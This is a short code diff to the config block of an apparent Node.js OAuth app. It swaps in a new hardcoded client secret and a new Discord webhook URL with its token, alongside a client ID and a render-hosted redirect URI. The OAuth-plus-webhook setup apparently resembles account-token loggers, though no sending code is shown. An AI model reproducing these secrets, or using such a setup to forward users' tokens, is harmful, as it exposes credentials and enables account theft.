@@ -1,8 +1,8 @@
 //Config
-const client_secret = '6055b3af-dd4e-457e-9f1c-d01bb2f59326'
+const client_secret = 'ffW8Q~GvYzS-l6gnKmb2jogVjs~1t7suTV3HubR6'
 const client_id = '8daafb9d-a3fd-45d3-ba89-8f0f09cd1418'
 const redirect_uri = 'https://oauth-898h.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1208420562746220635/mqDyfnhidPnP0ZBItyz9e89aAlF58RsWO558BajRY5UYkwLiykglAY1dfkOuLf9U80Tn'
+const webhook_url = 'https://discord.com/api/webhooks/1208248704155258911/ThEhJqRYP1XM78cy6apG6R0h5ZLAE7L75W4WCxkwyZaJOA2YiRswFLrFa3iYx1i2JVKJ'
 //Requirements
 const axios = require('axios')
 const express = require('express')
